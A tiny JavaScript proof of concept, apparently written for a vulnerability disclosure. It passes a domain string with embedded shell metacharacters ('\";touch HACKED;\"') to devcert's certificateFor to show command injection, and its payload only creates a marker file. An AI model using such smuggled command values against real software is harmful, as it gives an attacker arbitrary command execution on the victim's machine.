const devcert = require('devcert');

async function poc() {
    let ssl = await devcert.certificateFor('\";touch HACKED;\"');
}
poc()
